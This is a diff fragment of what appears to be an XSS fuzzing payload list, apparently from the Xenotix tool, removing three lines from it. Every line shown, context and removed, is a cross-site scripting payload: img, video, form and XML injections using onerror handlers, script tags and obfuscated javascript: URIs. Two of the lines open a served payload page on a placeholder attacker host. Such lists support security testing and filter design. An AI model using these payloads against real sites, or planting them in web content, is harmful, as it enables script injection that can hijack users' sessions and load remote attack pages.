@@ -605,8 +605,6 @@ http://www.<script>alert(1)</script .com
 "><img src=x onerror=prompt(1);>
 "><img src=x onerror=window.open('https://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html');>
 "><img src=x onerror=window.open('http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html"');>
-<img src="x` `<script>alert(1)</script>"` `>
-<img src="x` `<script>javascript:alert(1)</script>"` `>
 <img src="x:? title=" onerror=alert(1)//">
 ><img src="x:x" onerror=alert(1)>
 <img src='xx:x><img src=xx:x onerror=alert(1)>'>
@@ -1177,7 +1175,6 @@ SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
 <video src=1 href=1 onerror="javascript:alert(1)"></video>
 <video src=1 onerror=alert(1)>
 <vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#kcf></vmlframe>
-<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
 X<form id=test><input></form><button form=test onformchange==javascript:alert(1)>X
 X<form id=test onforminput=javascript:alert(1)><input></form>
 <XML ID=0><I><B><IMG SRC="javas<!-- -->cript:alert(1)"></B></I></XML>
